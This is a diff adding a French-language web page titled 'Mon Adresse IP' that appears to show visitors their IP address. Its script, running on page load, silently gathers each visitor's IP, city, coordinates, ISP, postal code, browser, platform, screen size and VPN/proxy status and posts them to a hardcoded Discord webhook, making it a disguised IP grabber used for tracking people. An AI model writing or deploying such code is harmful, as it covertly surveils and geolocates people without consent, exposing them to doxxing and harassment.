@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mon Adresse IP</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <body>
+        
+        <div class="content">
+            <h1></h1>
+            <p>Discord: zenith._.42</p>
+        </div>
+
+    </body>>
+    <script>
+        function getIP(json) {
+              var ip = json.ip;
+              document.getElementById("ip").textContent = ip;
+              sendToDiscord(ip);
+        }
+
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var script = document.createElement("script");
+            script.src = "https://api.ipify.org?format=jsonp&callback=getIP";
+            document.body.appendChild(script);
+        });
+
+        function sendToDiscord(ip) {
+            var webhookUrl = "https://discord.com/api/webhooks/1138936375417258075/7SKZY4KCtflw3XLcVsGga3umo8QfDbFz1d7d_6dOzDLvTuvMHsteitzlmmzPmYxZQHAH";
+
+            var locationUrl = "https://ipinfo.io/" + ip + "/json";
+            var xhrLocation = new XMLHttpRequest();
+            xhrLocation.open("GET", locationUrl, true);
+            xhrLocation.onreadystatechange = function() {
+                if (xhrLocation.readyState === 4 && xhrLocation.status === 200) {
+                    var locationData = JSON.parse(xhrLocation.responseText);
+
+                    var locationInfo = "Pays: " + locationData.country + ", Ville: " + locationData.city + "\n";
+                    if (locationData.loc) {
+                        var locArray = locationData.loc.split(",");
+                        var latitude = locArray[0];
+                        var longitude = locArray[1];
+                        locationInfo += "Latitude: " + latitude + ", Longitude: " + longitude + "\n";
+                    }
+                    if (locationData.org) {
+                        locationInfo += "Fournisseur d'Accès Internet: " + locationData.org + "\n";
+                    }
+                    if (locationData.region) {
+                        locationInfo += "Région: " + locationData.region + "\n";
+                    }
+                    if (locationData.hostname) {
+                        locationInfo += "Nom d'Hôte: " + locationData.hostname + "\n";
+                    }
+                    if (locationData.postal) {
+                        locationInfo += "Code Postal: " + locationData.postal + "\n";
+                    }
+                    if (locationData.timezone) {
+                        locationInfo += "Fuseau Horaire: " + locationData.timezone;
+                    }
+
+                    var systemInfo = "Type de Navigateur: " + navigator.appCodeName + "\n";
+                    systemInfo += "Cookies activés: " + navigator.cookieEnabled + "\n";
+                    systemInfo += "Langue du Navigateur: " + navigator.language + "\n";
+                    systemInfo += "Plate-forme: " + navigator.platform + "\n";
+                    systemInfo += "Agent Utilisateur: " + navigator.userAgent;
+
+                    var isVPN = locationData.vpn === "true" ? "Oui" : "Non";
+                    var isProxy = locationData.proxy === "true" ? "Oui" : "Non";
+
+                    var data = {
+                        embeds: [{
+                            title: "Nouvelle Adresse IP Détectée",
+                            description: "Une nouvelle adresse IP a été détectée sur le site.",
+                            color: 0x00ff00,
+                            fields: [
+                                {
+                                    name: "Adresse IP",
+                                    value: ip,
+                                    inline: false
+                                },
+                                {
+                                    name: "Navigateur",
+                                    value: navigator.userAgent,
+                                    inline: false
+                                },
+                                {
+                                    name: "Langue du Navigateur",
+                                    value: navigator.language,
+                                    inline: true
+                                },
+                                {
+                                    name: "Résolution de l'Écran",
+                                    value: screen.width + "x" + screen.height,
+                                    inline: true
+                                },
+                                {
+                                    name: "Système d'Exploitation",
+                                    value: navigator.platform,
+                                    inline: true
+                                },
+                                {
+                                    name: "Fuseau Horaire",
+                                    value: new Date().toLocaleTimeString('en-us', { timeZoneName: 'short' }),
+                                    inline: true
+                                },
+                                {
+                                    name: "Informations de Localisation",
+                                    value: locationInfo,
+                                    inline: true
+                                },
+                                {
+                                    name: "Informations Système",
+                                    value: systemInfo,
+                                    inline: true
+                                },
+                                {
+                                    name: "Utilise un VPN",
+                                    value: isVPN,
+                                    inline: true
+                                },
+                                {
+                                    name: "Utilise un Proxy",
+                                    value: isProxy,
+                                    inline: true
+                                }
+                            ]
+                        }]
+                    };
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookUrl, true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(JSON.stringify(data));
+                }
+            };
+            xhrLocation.send();
+        }
+    </script>
+</head>
+<body>
+    <p> Votre adresse IP est : 
+    <span id="ip"></span>
+
+</body>
+</html>
